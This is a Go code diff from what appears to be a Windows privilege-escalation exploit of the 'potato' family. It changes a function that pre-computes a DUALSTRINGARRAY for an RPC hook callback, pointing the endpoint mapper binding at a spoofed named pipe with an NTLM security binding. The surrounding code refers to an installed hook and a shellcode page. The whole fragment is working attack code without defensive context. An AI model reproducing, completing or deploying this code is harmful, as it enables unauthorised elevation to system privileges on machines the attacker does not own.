@@ -147,40 +147,43 @@ func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
 }
 
 // buildPipeDSA pre-computes the DUALSTRINGARRAY bytes for the hook callback.
+// Uses the binary DUALSTRINGARRAY format: tower ID (uint16) + address (UTF-16LE).
 // This is called during setup (before hook install) so the callback itself
 // does only minimal work: HeapAlloc + memcpy + pointer write.
 func buildPipeDSA(pipeUniqueName string) []byte {
-	endpoints := []string{
-		"ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`,
-		"ncacn_ip_tcp:127.0.0.1",
+	// Named pipe string binding: tower 0x000F (ncacn_np)
+	// Address format: "server[\pipe\pipename]"
+	npTowerID := uint16(0x000F)
+	npAddr := utf16Encode(`localhost[\pipe\` + pipeUniqueName + `\pipe\epmapper]`)
+
+	// Build string bindings section
+	stringBinding := make([]byte, 0, 128)
+	tb := make([]byte, 2)
+	binary.LittleEndian.PutUint16(tb, npTowerID)
+	stringBinding = append(stringBinding, tb...)
+	for _, c := range npAddr {
+		cb := make([]byte, 2)
+		binary.LittleEndian.PutUint16(cb, c)
+		stringBinding = append(stringBinding, cb...)
 	}
+	stringBinding = append(stringBinding, 0, 0) // null terminator for this binding
+	stringBinding = append(stringBinding, 0, 0) // end of string bindings (double null)
 
-	// Calculate entry count (in uint16 units)
-	entriesCount := 3 // double-null end + empty sec binding + null
-	for _, ep := range endpoints {
-		entriesCount += len(ep) + 1
-	}
+	stringEntries := len(stringBinding) / 2
 
-	bufSize := entriesCount*2 + 10
-	buf := make([]byte, bufSize) // zero-filled
+	// Security binding: wAuthnSvc=0x000A (NTLM), wAuthzSvc=0xFFFF, empty principal
+	secBinding := []byte{0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00}
+	secEntries := len(secBinding) / 2
 
-	offset := 0
-	// wNumEntries
-	binary.LittleEndian.PutUint16(buf[offset:], uint16(entriesCount))
-	offset += 2
-	// wSecurityOffset
-	binary.LittleEndian.PutUint16(buf[offset:], uint16(entriesCount-2))
-	offset += 2
-	// Write each endpoint as UTF-16LE characters
-	for _, ep := range endpoints {
-		for _, ch := range ep {
-			binary.LittleEndian.PutUint16(buf[offset:], uint16(ch))
-			offset += 2
-		}
-		offset += 2 // null terminator (already zero)
-	}
+	totalEntries := stringEntries + secEntries
 
-	return buf[:4+entriesCount*2]
+	result := make([]byte, 4+totalEntries*2)
+	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
+	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
+	copy(result[4:], stringBinding)
+	copy(result[4+stringEntries*2:], secBinding)
+
+	return result
 }
 
 // hookFlagOffset is the offset within the shellcode page where the hook-called
